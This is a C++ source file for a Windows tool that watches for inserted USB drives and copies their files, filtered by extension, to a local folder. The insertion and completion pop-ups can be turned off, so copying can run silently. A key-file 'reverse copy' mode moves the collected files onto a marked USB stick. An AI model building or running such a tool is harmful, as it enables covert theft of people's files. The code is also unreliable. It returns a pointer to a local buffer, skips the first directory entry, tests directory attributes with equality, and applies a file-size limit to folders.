#include "pch.h"
#include "Copier.h"
#include "Extension.h"// 扩展名相应函数
#include<time.h>

//初始化类 扩展名
extern Extension EX;
CString strFolderPath;
int int_getFileSize;
int int_getDelay;
TCHAR lastDrive=' ';//上次的磁盘  避免打开自动复制后，会对同一个磁盘进行多次复制
bool isSplitDir;//分文件复制

//查找那个关键的文件，如果有就启动反向复制
bool Copier::checkKeyFile(LPCTSTR path, LPCTSTR type) {

	std::string key = str_reverseCopyKey;//找谁

	WIN32_FIND_DATA findData;
	TCHAR fullPath[MAX_PATH] = { 0 };//完整路径
	_stprintf(fullPath, _T("%s\\%s"), path, type);//格式化出一个完整的路径

	HANDLE hFind = FindFirstFile(fullPath, &findData);//查找第一个文件

	if (hFind == INVALID_HANDLE_VALUE) {//没有文件就直接返回
		//cout << "cant find file." << endl;
		return 0;
	}

	while (1) {
		//必须新建WIN32_FIND_DATA
		WIN32_FIND_DATA tempFindData;
		int ret = FindNextFile(hFind, &tempFindData);
		if (ret == 0) {//在遍历完所有文件后ret变为0
			break;
		}
		std::string fileName = tempFindData.cFileName;
		if (fileName.find(key) != std::string::npos) {//如果if下面不执行赋值以外的语句，会直接跳过
			return 1;//找到了 返回真
		}
	}
	return 0;
}

LPCTSTR creatTimeDir() {
	time_t now = time(nullptr);
	tm* curr_tm = localtime(&now);
	TCHAR timeDir[MAX_PATH] = { 0 };//时间文件夹
	_stprintf(timeDir, _T("%d-%d-%d"), 1900 + (curr_tm->tm_year), 1 + (curr_tm->tm_mon), curr_tm->tm_mday);//格式化出一个含有时间信息的文件夹
	return timeDir;
}

//分文件复制，把它写成一个函数然后放到initPATH内
void Copier::splitDir() {
	if (isSplitDir) {//如果打开了分文件编写
		LPCTSTR timeDir = creatTimeDir();//创建时间文件夹
		
		TCHAR fullPath[MAX_PATH] = { 0 };//完整路径
		_stprintf(fullPath, _T("%s\\%s"), PATH, timeDir);//格式化出一个完整的路径	
		PATH = fullPath;//改变PATH
		creatDir(PATH);//再创建相应的时间文件夹

		//MessageBox(NULL, _T(PATH), _T("提示"), MB_OK | MB_ICONINFORMATION);
	}
}


//初始化路径 将编辑框内的路径加载到类内
void Copier::initPATH() {
	PATH = strFolderPath;
	reversePATH = strFolderPath;
	splitDir();
}

//创建文件夹
void Copier::creatDir(LPCTSTR path) {
	bool ret = CreateDirectory(path, NULL);
}

//复制文件到某个文件夹(路径)
void Copier::copyFile(LPCTSTR path, LPCTSTR newPath) {
	bool bRet = CopyFile(path, newPath, true);
}


// 计算文件大小 返回单位：MB
double Copier::calFileSize(WIN32_FIND_DATAA tempFindData) {
	LARGE_INTEGER fileSize;//文件大小
	fileSize.LowPart = tempFindData.nFileSizeLow;//低位
	fileSize.HighPart = tempFindData.nFileSizeHigh;//高位
	//低位和高位合成一个总的
	return (static_cast<double>(fileSize.QuadPart) / 1024) / 1024;//fileSize.QuadPart是字节
	//MessageBox(NULL, _T("检测到U盘插入"), _T("提示"), MB_OK | MB_ICONINFORMATION);
}


//查找指定路径下的文件及其子文件
bool Copier::findfile(LPCTSTR path, LPCTSTR type) {
	//务必改为使用多字符集

	WIN32_FIND_DATA findData;
	TCHAR fullPath[MAX_PATH] = { 0 };//完整路径
	_stprintf(fullPath, _T("%s\\%s"), path, type);//格式化出一个完整的路径

	HANDLE hFind = FindFirstFile(fullPath, &findData);

	if (hFind == INVALID_HANDLE_VALUE) {
		//cout << "cant find file." << endl;
		return 0;
	}

	while (1) {
		//必须新建WIN32_FIND_DATA
		WIN32_FIND_DATA tempFindData;
		int ret = FindNextFile(hFind, &tempFindData);

		if (ret == 0) {//在遍历完所有文件后ret变为0
			break;
		}


		if (tempFindData.cFileName[0] != '.') {//.文件是当前目录  ..文件夹指的是上层目录

			if (tempFindData.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {//ATTRIBUTE:属性
				//进行文件大小的限制
				double retFileSize = calFileSize(tempFindData);
				if (int_getFileSize <= retFileSize) {
					continue;//本次不进行
				}

				//cout << "打开了文件夹:";
				//cout << tempFindData.cFileName << endl;//打印文件名
				//cout << "------------------------" << endl;//打印分割线


				//合成可以用于拷贝的文件路径
				TCHAR thisPath[MAX_PATH] = { 0 };
				std::string eraseEPath;//经过删除处理后的字符串

				_stprintf(thisPath, _T("%s\\%s"), path, tempFindData.cFileName);//格式化
				//cout << "发现文件夹" << thisPath << endl;

				eraseEPath = thisPath;

				//stringstream可以将任意东西转为字符串
				std::stringstream ss;
				ss << m_findPath;//将drivePath转为字符串
				std::string deleteContent;//删除内容
				ss >> deleteContent;
				deleteContent = deleteContent + "\\";//在磁盘名称后面添加:\\

				eraseEPath.erase(eraseEPath.find(deleteContent), deleteContent.size());


				//在本地也创建相应的文件夹
				TCHAR dirPath[MAX_PATH] = { 0 };
				_stprintf(dirPath, _T("%s\\%s"), PATH, eraseEPath.c_str());//合成用于创建本地文件夹的路径

				creatDir(dirPath);//调用创建函数在本地创建该文件夹

				//TCHAR szPath[MAX_PATH] = { 0 };
				_stprintf(dirPath, _T("%s\\%s"), path, tempFindData.cFileName);//合成用于遍历文件夹的路径

				findfile(dirPath, _T("*.*"));//传入新的路径 
				//第三个参数，传入该文件夹的名字
			}
			else {
				std::string FileName = tempFindData.cFileName;//得到文件名及其后缀(格式)
				//string FileName = wideCharToMultiByte(tempFindData.cFileName);//此语句在使用unicode字符集时使用

				//cout << "文件名:";
				//cout << tempFindData.cFileName << endl;

				//在if增加你想要的特定格式的文件
				if (EX.checkExtension(FileName)) {
					//合成可以用于拷贝的文件路径
					TCHAR thisPath[MAX_PATH] = { 0 };
					_stprintf(thisPath, _T("%s\\%s"), path, tempFindData.cFileName);//格式化
					//cout << "发现文件" << thisPath << endl;

					//删除前面的磁盘名称（E:\\）便于合成新的文件夹路径
					std::string eraseEPath = thisPath;

					//stringstream可以将任意东西转为字符串
					std::stringstream ss;
					ss << m_findPath;//将drivePath转为字符串
					std::string deleteContent;//删除内容
					ss >> deleteContent;
					deleteContent = deleteContent + "\\";//在磁盘名称后面添加:\\

					eraseEPath.erase(eraseEPath.find(deleteContent), deleteContent.size());
					//如果不在文件夹内那么将eraseEPath将为空


					//合成带文件夹的本地路径
					TCHAR addDirNamePath[MAX_PATH] = { 0 };
					_stprintf(addDirNamePath, _T("%s\\%s"), PATH, eraseEPath.c_str());
					copyFile(thisPath, addDirNamePath);
					//第一个是原文件的路径，第二个是该电脑上用来存储的路径，第三个是直接把原来的路径和名字拿过来用
				}

			}

		}

	}

	FindClose(hFind);//关闭文件

	return 1;
}



void Copier::getDrives() {
	TCHAR TDrives[MAX_PATH] = { 0 };
	int key = 0;//如果没有类型3就不结束


	while (key != 2) {
		//获取所有磁盘
		GetLogicalDriveStrings(MAX_PATH, TDrives);

		TCHAR* signal = TDrives;
		while (*signal) {//得到类型
			if (GetDriveType(signal) == 2) {
				key = GetDriveType(signal);
				
				Sleep(int_getDelay * 1000);
				if (*signal != lastDrive) {//如果不是上次复制过的
					drivePath = *signal;
					lastDrive = *signal;
					//对于同一块U盘只提示一次
					if (m_MessagePrompt) {//是否提示u盘插入
						MessageBox(NULL, _T("检测到U盘插入"), _T("提示"), MB_OK | MB_ICONINFORMATION);
					}
				}
				else {
					key = 123;//通过改变key来使循环继续
					//MessageBox(NULL, _T("检测到此U盘已进行过复制"), _T("提示"), MB_OK | MB_ICONINFORMATION);
				}
			
			}
			else {
				//cout << "正在检测..." << endl;
				Sleep(250);
			}
			signal += 1 + _tcslen(signal);
		}
		//cout << "没有U盘插入" << endl;
		if (key == 0) {//当key=0时，有两种情况，一种是确实没有u盘插入，另一种是那个u盘没拔下来,所以把u盘没拔下来时改为123以区分
			lastDrive = ' ';//当确实没有u盘插入时，也有两种情况，一种是根本没插，另一种是U盘插了又拔了
			// 这样的话，即便是同一块U盘，每插入一次只进行一次复制，不会造成持续的复制,只会持续地检测是否有U盘插入
		}

		Sleep(250);
		//system("cls");
	}

}

void Copier::swapTwo(LPCTSTR fullPath) {//反转两个路径
	m_findPath = reversePATH;//查找路径切换到原保存路径内

	PATH = fullPath;//保存路径切换到u盘内
}


void Copier::getFiles() {
	getDrives();
	initPATH();//初始化路径

	TCHAR fullPath[MAX_PATH] = { 0 };//完整路径
	_stprintf(fullPath, _T("%c:"), drivePath);//格式化

	if (m_reverseCopy && checkKeyFile(fullPath, _T("*.*")) == 1) {//勾选反向复制，并且有key文件
		swapTwo(fullPath);//交换后才能实现反向操作
	}
	else {
		m_findPath= fullPath;//没有反向操作的正常复制
	}
	
	findfile(m_findPath, _T("*.*"));

	if (m_MessagePrompt) {//是否提示复制完成
		MessageBox(NULL, _T("已完成拷贝"), _T("提示"), MB_OK | MB_ICONINFORMATION);
	}
}
